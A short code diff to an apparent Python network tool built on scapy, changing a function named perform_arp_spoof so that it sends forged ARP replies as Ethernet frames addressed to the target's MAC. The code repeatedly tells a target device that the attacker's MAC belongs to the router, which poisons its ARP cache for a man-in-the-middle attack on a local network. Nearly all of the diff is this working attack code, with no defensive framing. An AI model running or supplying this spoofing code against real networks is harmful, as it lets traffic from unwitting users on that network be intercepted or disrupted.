@@ -6,7 +6,7 @@ import time
 import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from scapy.all import ARP, send
+from scapy.all import ARP, Ether, send, sendp
 
 
 class Colors:
@@ -290,8 +290,10 @@ def perform_arp_spoof(target_ip, spoof_ip, online_devices, count=10):
         hwsrc=our_mac
     )
 
+    packet = Ether(dst=target_mac) / arp_response
+
     for _ in range(count):
-        send(arp_response, verbose=False)
+        sendp(packet, verbose=False)
         time.sleep(1)  # Short delay between sends
     print(f"ARP Spoofing sent {count} times from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")
 
